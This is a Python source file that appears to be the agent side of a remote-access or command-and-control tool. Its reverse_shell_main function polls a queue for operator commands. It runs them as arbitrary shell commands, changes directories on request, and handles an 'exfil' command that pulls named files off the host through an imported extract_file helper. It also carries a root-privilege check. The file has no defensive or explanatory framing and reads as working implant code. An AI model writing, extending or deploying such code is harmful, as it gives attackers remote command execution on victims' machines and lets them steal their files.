import os
import shlex
import subprocess
from queue import Queue
from time import sleep
from unittest import result
from ..helper import extract_file
from hashlib import sha256
import logging 

def hash(filename, algo=sha256, chunk_size: int = 32):
    hash = algo()
    with open(filename, "rb") as file:
        chunk = file.read(chunk_size)
        while chunk:
            hash.update(chunk)
            chunk = file.read(chunk_size)
    return hash.hexdigest()

def is_root():
    if os.getuid() == 0:
        return True
    return False

def reverse_shell_main(command: Queue, result_queue: Queue, sec: int = 2):
    while True:
        sleep(sec)
        logging.debug(f"looping every {sec}s")
        if command.qsize() != 0:
            cmd = command.get()
            logging.info(f"Executing command {cmd}")

            cmd = cmd.replace('"','')

            if cmd.startswith('exfil '):
                logging.debug(f"Use Filename: {cmd[6:]}")
                filename = cmd[6:]
                result_queue.put(f"exfiltrating: {filename}")
                extract_file(result_queue, f"{filename}")
            elif cmd.startswith('cd '):
                try:
                    os.chdir(cmd[3:])
                    result_queue.put(os.getcwd())
                except:
                    result_queue.put('path not found')
            else:
                try:
                    logging.debug(f"Cmd: {cmd}  {type(cmd)}")
                    output, error = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
                    logging.debug(f"result: {output} - {error}")
                    if output != b'':
                        result = output.decode('ISO-8859-1')
                        logging.debug(f"output: {result}")
                    else:
                        result = error.decode('ISO-8859-1')
                        logging.debug(f"output: {result}")
                except Exception as e:
                    result = f"could not execute command {cmd}: {e}"
                    logging.exception(result)
                finally:
                    result_queue.put(result)
                    
                    
                

        
